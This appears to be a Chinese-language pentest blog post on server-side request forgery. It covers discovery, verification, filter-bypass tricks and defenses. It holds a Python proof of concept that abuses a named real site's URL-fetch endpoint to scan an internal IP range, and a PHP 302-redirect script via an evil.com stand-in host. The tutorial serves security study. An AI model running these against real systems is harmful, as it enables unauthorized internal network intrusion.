<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content=""/>
  <meta name="author" content="Reber"/>
  
    
      <title>SSRF | Reber&#39;s Blog</title>
    
  
  <link rel="stylesheet" href="/css/reset.css"/>
  
  <link rel="stylesheet" href="/css/smigle.css"/>
  
    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
  
    <link rel="stylesheet" href="/css/style.css"/>
  
  
    <script src="/js/jquery-3.6.0.min.js"/></script>
  
    <script src="/js/highlight.min.js"/></script>
  
    <script src="/js/style.js"/></script>
  
  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
</head>

  <body>
    <header>
  <div id="brand">
    <a class="icon-link" href="https://wyb0.com/">
      <img
        class="icon"
        src="/img/logo.png"
      />
    </a>
    <div class="text">
      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
      <h3>只会一点点编程、只会一点点渗透</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/posts/"><b>Posts</b></a>
      
         | 
        <a href="/categories/"><b>Categories</b></a>
      
         | 
        <a href="/tags/"><b>Tags</b></a>
      
         | 
        <a href="/about/"><b>About</b></a>
      
         | 
        <a href="/friends/"><b>Friends</b></a>
      
    
  </nav>
  <hr />
</header>

    <div id="content">
      
  <main>
    <article>
      <h1>SSRF</h1>
      
<div class="post-meta">
    <time>2016-06-30</time>
    
    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/ssrf">ssrf</a>)
</div>

      <div><h3 id="0x00-什么是ssrf">0x00 什么是SSRF</h3>
<p>SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，<!-- raw HTML omitted -->它将一个可以发起网络请求的服务当作跳板来攻击其他服务<!-- raw HTML omitted -->，SSRF的攻击目标一般是<!-- raw HTML omitted -->内网<!-- raw HTML omitted -->。<br>
当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。</p>
<h3 id="0x01-ssrf的危害">0x01 SSRF的危害</h3>
<p>可以扫描内部网络<br>
可以构造数据攻击内部主机</p>
<h3 id="0x02-漏洞挖掘">0x02 漏洞挖掘</h3>
<p>其实只要能对外发起网络请求就有可能存在SSRF漏洞。</p>
<pre tabindex="0"><code>1. 从WEB功能上寻找
    通过URL分享内容
    文件处理、编码处理、转码等服务
    在线翻译
    通过URL地址加载与下载图片
    图片、文章的收藏
    设置邮件接收服务器
2. 从URL关键字寻找
    share、wap、url、link、src、source、target、u、3g、
    display、sourceURl、imageURL、domain...
</code></pre><h3 id="0x03-漏洞验证">0x03 漏洞验证</h3>
<pre tabindex="0"><code>http://www.aa.com/ss.php?image=http://www.baidu.com/img/bd_logo1.png
1. 右键在新窗口打开图片，图片地址为http://www.baidu.com/img/bd_logo1.png，
    说明不存在SSRF漏洞。  
2. firebug看网络连接信息，若没有http://www.baidu.com/img/bd_logo1.png
    这个图片请求，则证明图片是aa.com服务端发起的请求，则可能存在SSRF漏洞。
</code></pre><h3 id="0x04-绕过过滤">0x04 绕过过滤</h3>
<p>有时漏洞利用时会遇到IP限制，可用如下方法绕过：</p>
<pre tabindex="0"><code>* 使用@：http://A.com@10.10.10.10 = 10.10.10.10
* IP地址转换成十进制、八进制：127.0.0.1 = 2130706433
* 使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx
* 端口绕过：ip后面加一个端口
* xip.io：10.0.0.1.xip.io = 10.0.0.1
        www.10.0.0.1.xip.io = 10.0.0.1
        mysite.10.0.0.1.xip.io = 10.0.0.1
        foo.bar.10.0.0.1.xip.io = 10.0.0.1
* 通过js跳转
</code></pre><h3 id="0x05-通用的ssrf实例">0x05 通用的SSRF实例</h3>
<ul>
<li>weblogin配置不当，天生ssrf漏洞</li>
<li>discuz x2.5/x3.0/x3.1/x3.2 ssrf漏洞</li>
<li>CVE-2016-1897/CVE-2016-1898 - FFMpeg</li>
<li>CVE-2016-3718 - ImageMagick</li>
</ul>
<h3 id="0x06-附实例poc">0x06 附实例POC</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> IPy <span style="color:#f92672">import</span> IP
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> Queue
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_url_queue</span>():
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://www.sogou.com/reventondc/external?key=&amp;objid=&amp;type=2&amp;charset=utf-8&amp;url=http://&#34;</span>
</span></span><span style="display:flex;"><span>    urllist <span style="color:#f92672">=</span> Queue<span style="color:#f92672">.</span>Queue()
</span></span><span style="display:flex;"><span>    ip_list <span style="color:#f92672">=</span> IP(<span style="color:#e6db74">&#39;10.146.20.0/24&#39;</span>)
</span></span><span style="display:flex;"><span>    port_list <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;80&#39;</span>,<span style="color:#e6db74">&#39;8000&#39;</span>,<span style="color:#e6db74">&#39;8080&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ip_add <span style="color:#f92672">in</span> ip_list:
</span></span><span style="display:flex;"><span>        ip_add <span style="color:#f92672">=</span> str(ip_add)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> port <span style="color:#f92672">in</span> port_list:
</span></span><span style="display:flex;"><span>            url_t <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> ip_add <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;:&#39;</span> <span style="color:#f92672">+</span> port
</span></span><span style="display:flex;"><span>            urllist<span style="color:#f92672">.</span>put(url_t)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> urllist
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_title</span>(urllist):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> urllist<span style="color:#f92672">.</span>empty():
</span></span><span style="display:flex;"><span>        url <span style="color:#f92672">=</span> urllist<span style="color:#f92672">.</span>get()
</span></span><span style="display:flex;"><span>        html <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)<span style="color:#f92672">.</span>text
</span></span><span style="display:flex;"><span>        patt <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;&lt;title&gt;(.*?)&lt;/title&gt;&#39;</span>
</span></span><span style="display:flex;"><span>        m <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(patt,html)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> m:
</span></span><span style="display:flex;"><span>            title <span style="color:#f92672">=</span> m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (url,title)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>urllist <span style="color:#f92672">=</span> get_url_queue()
</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;start get title...&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">30</span>):
</span></span><span style="display:flex;"><span>    t <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>get_title,args<span style="color:#f92672">=</span>(urllist,))
</span></span><span style="display:flex;"><span>    t<span style="color:#f92672">.</span>start()
</span></span></code></pre></div><h3 id="0x07-防御">0x07 防御</h3>
<ul>
<li>限制协议为http或https</li>
<li>禁止30x转跳</li>
<li>过滤参数(只要出现内网ip或域名就直接干掉)</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>302跳转</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">//在自己服务器上建立文件，利用302跳转到对方内网地址。
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//http://target.com/httpProxyAccess.htm?go=http://evil.com/a.php?url=http://10.11.213.57
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//a.php内容如下：
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>    $url <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;url&#39;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location:&#34;</span><span style="color:#f92672">.</span>$url);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><ul>
<li>iframe</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">//在自己服务器建立文件，利用iframe标签请求对方内网地址。
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//参考http://www.secpulse.com/archives/50034.html
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;对方内网地址&#34;</span><span style="color:#f92672">&gt;</span>
</span></span></code></pre></div></div>
    </article>
  </main>

    </div>
    <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      
        
        <a href="https://github.com/reber0?_blank">GitHub</a>
      
         • 
        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
      
    </p>
  
  <p class="copyright">
    Copyright © 2015-2023
    <a href="https://wyb0.com/"><strong>Reber</strong></a>.

    Built with
    <a href="http://www.gohugo.io/">Hugo</a>,
    based on the theme
    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
  </p>
</footer>

  </body>
</html>
